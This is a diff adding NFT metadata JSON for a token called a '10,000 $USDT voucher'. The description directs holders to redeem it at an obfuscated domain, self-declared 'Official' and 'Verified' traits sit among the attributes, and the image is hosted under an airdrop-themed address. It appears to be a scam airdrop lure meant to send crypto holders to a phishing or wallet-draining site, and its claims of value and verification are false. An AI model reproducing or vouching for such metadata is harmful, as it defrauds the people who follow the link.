@@ -1,1 +1,19 @@
-
+{
+  "name": "10,000 $USDT voucher",
+  "description": "Exchange this item for 10,000 $USDT at: usdtxton. info",
+  "attributes": [
+    {
+      "trait_type": "Value",
+      "value": "10,000"
+    },
+    {
+      "trait_type": "Official",
+      "value": "True"
+    },
+    {
+      "trait_type": "Verified",
+      "value": "True"
+    }
+  ],
+  "image": "https://dogsairdrop.github.io/dogs-metadata/dogs-nft.png"
+}
